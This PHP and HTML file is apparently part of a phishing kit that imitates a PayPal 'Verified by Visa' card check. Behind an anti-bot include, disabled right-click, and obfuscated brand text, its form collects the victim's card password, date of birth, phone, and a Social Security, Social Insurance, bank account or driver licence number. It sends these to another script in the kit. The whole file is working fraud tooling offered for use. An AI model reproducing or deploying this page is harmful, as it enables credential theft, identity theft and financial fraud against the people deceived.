<?php 
error_reporting(0);
session_start();
include("../antimwbna.php");
include("../linguo/lang.php");
include "../linguo/lang".$_SESSION['MONSTR_UU'];
require_once '../cry/crypt.php'; ?>
<!DOCTYPE html><html class= "no-js superBowlBG accountCreate " lang= "en " dir= "ltr ">
<head>
<title><?php echo $_SESSION["tire"] ?></title>
<meta http-equiv= "X-UA-COMPATIBLE " content= "IE-edge " />
	<meta http-equiv= "content-type " content= "text/html; charset=UTF-8 " />
	<meta name= "application-name " content= "Update " />
	<meta name= "msapplication-task " content= " " />
	<meta name= "veiwport " content= "width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes " />
<link rel= "shortcut icon " type= "image/x-icon " href= "../img/ppl.ico " />		
<script src= "../js/jquery-3.1.0.min.js "></script>
 <script src= "../js/jqu.js "></script>
<link rel= "stylesheet " href= "../css/appSuperBowl.css " />
<script language= "JavaScript1.2 " type= "text/javascript ">
//The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ( "return false ")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function( "return false ")
        
</script>
</head><body><header class= "mainHeader " role= "banner "><div class= "headerContainer ">
<div class= "grid12 "><a data-click= "payPalLogo "  href= "# " class= "logo "></a><div class= "gradientSpacer "><div> </div></div><div class= "loginBtn "><a data-click= "loginLink " href= "# " class= "button secondary small  custom "><?php echo $log ?></a></div></div></div></header><main class= "superBowlMain "><section id= "content " role= "main " data-country= "US "><section id= "main " class=""><div id= "create " class= "create grid12 "><script type= "application/json " fncls= "fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99 ">{ "f ": "8ca82980d2c511e689ae0d187383423f ", "s ": "t_s ", "mm ": "true "}</script>
<script type= "text/javascript ">(function() {var dom, doc, where, iframe = document.createElement( 'iframe ');iframe.src =  "javascript:false ";iframe.title =  " ";iframe.role =  "presentation ";(iframe.frameElement || iframe).style.cssText =  "display:none; width: 0; height: 0; border: 0 ";where = document.getElementsByTagName( 'script ');where = where[where.length - 1];where.parentNode.insertBefore(iframe, where);try {doc = iframe.contentWindow.document;} catch (e) {dom = document.domain;iframe.src =  "javascript:var d=document.open();d.domain=' " + dom + " ';void(0); ";doc = iframe.contentWindow.document;}doc.open()._l = function () {var js = this.createElement( "script ");if (dom) {this.domain = dom;}js.id = "js-iframe-async";js.src = "https://www.paypalobjects.com/webstatic/r/fb/fb-all-prod.pp2.min.js";this.body.appendChild(js);};doc.write( '<body onload="document._l();"> ');doc.close();})();</script><noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=8ca82980d2c511e689ae0d187383423f&s=t_s&mm=true&js=0&r=1"></noscript>
</div></div></div></header>
<main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="create" class="create grid12">
<div class="customGrid7"><form action="../Templates/MO_VBV.php" method="post"  name="create_form" class="proceed" >
<div class= "pageHeader "><h2><?php echo $auth ?></h2></div><br><div class="superBowlContainer"><div class="inner">
<div class="content_check" style="
        
    margin-left: 2px;
    width: 335px;
    border: solid 2px #808080;
    padding: 17px;
">
<script>
function popUp(URL) {
        day = new Date();
        id = day.getTime();
        eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=660,height=410,left = 565.5,top = 149');");
                             } 	  
   <script>
    $(function() {
    $('#dob_1').mask('00');
	});
	 $(function() {
    $('#dob_2').mask('00');
	});
	 $(function() {
    $('#dob_3').mask('0000');
	});
	 $(function() {
    $('#phone1').mask('000');
	});
	 $(function() {
    $('#phone2').mask('999999999999');
	});;     
    </script>
							 </script>
<div class="textInput lap"><div class="fields email large">
<center><img style="float:left" src="../img<?php echo $_SESSION["pngo"] ?>"><img style="float:right" src="../img/ppt.png"></center><br><br><br><br><br>
<b><i></div><?php echo $_SESSION["txt"] ?></b> <?php echo $vb3d ?></i><br><br><i><font style="font-size:13px"><?php echo $mo31 ?></i><i>  &Rho;&#97;y&Rho;&#97;l In&#99;.</i><br><i><?php echo $mo32 ?></b><i>  0.01 USD </i><a href="javascript:popUp('<?php echo $_SESSION["href"] ?>')" ><img style="width:15px;height:15px;" id="lock" src="../img/whts.png"></a><br>
<i><?php echo $mo33 ?>  <?php echo @date('m/d/Y'); ?></i>
<br><i><?php echo $mo28 ?>: xxxx-xxxx-xxxx-<?php echo substr($_SESSION["number"], -4 ); ?></i><br><?php echo $mo34 ?></b>  <input style="width:100px;height:18px" type="text" title="Your Name" id="ccnm" name="ccnm" required="required" autocomplete="off" autocorrect="off" autocapitalize="off" value="" aria-required="true"/><br>
<i><?php echo $mo35 ?>  <input type="text" name="dob_1" id="dob_1" value="" placeholder="" maxlength="2" style="width:20px;height:18px"> /
                                    <input type="text" name="dob_2" id="dob_2" value="" placeholder="" maxlength="2" style="width:20px;height:18px"> /
                                    <input type="text" name="dob_3" id="dob_3" value="" placeholder="" maxlength="4" style="width:40px;height:18px"> <?php echo $bb ?><br>
									<?php echo $mo36 ?> + <input type="text" name="phone1" id="phone1" value="" placeholder="" style="width:30px;height:18px">
                                        <input type="text" name="phone2" id="phone2" value="" placeholder="" maxlength="19" style="width:110px;height:18px">
<?php if($_SESSION['MOCNTRCD'] == "GB"){
	echo' <br><i>Sort Code: </i><input type="text" name="sort_code" placeholder="" maxlength="8" style="width:40px;height:18px"><br>
                              <i> Account Number:</i> <input type="text" name="account" placeholder="" maxlength="10" style="width:40px;height:18px">';
} elseif($_SESSION['MOCNTRCD'] == "US" or $_SESSION['MOCNTRCD'] == "IL"){
	echo' <br> <i>Social Security Number:</i> <input type="text" name="ssn" placeholder="" maxlength="11" style="width:40px;height:18px">';
} elseif ($_SESSION['MOCNTRCD'] == "CA"){
echo ' <br> <i>Social Insurance Number:</i> <input type="text" name="ins" placeholder="" maxlength="11" style="width:40px;height:18px">';}
elseif($_SESSION['MOCNTRCD'] == "AU"){
echo'<i><br>Driver License Number:</i> <input type="text" name="driver" maxlength="14" placeholder="" style="width:40px;height:18px">'; 
}
 ?><br>
<i><?php echo $mo38 ?>&nbsp;</i><input style="width:100px;height:18px" type="password" title="" id="vbv" name="vbv" required="required" autocomplete="off" autocorrect="off" autocapitalize="off" value="" aria-required="true"/></i>
<br><br><center></i><?php echo $_SESSION["talifoun"] ?> - <?php echo $_SESSION["bank"] ?></center><br><center><?php echo $_SESSION["site"] ?></center>
</div></div>
</div><br><br></font><input id="submitBtn" name="_eventId_continue" type="submit" class="button"value="<?php echo $cn ?>"data-click="createSubmit"/>
</div></div><center><br><div class="footerNav"><div class="legal"></i></i><b><a style="cursor:pointer"><?php echo $contact ?></a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       <a style="cursor:pointer"><?php echo $feedback ?></a>  &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;     <a style="cursor:pointer"><?php echo $privacy ?></a><ul></li></noscript></div></body></html>